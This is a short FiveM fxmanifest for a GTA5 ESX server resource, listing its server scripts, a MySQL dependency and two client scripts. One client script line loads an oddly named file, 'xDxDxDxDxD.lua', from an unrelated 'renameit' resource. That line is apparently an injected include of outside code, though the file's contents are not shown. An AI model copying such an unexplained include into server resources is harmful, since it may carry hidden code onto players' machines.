fx_version('bodacious')
game('gta5')

server_scripts({
	'@async/async.lua',
	'@mysql-async/lib/MySQL.lua',
	'server/main.lua'
})

dependency('es_extended')

client_script '@renameit/xDxDxDxDxD.lua'

client_script 'Adastra.lua'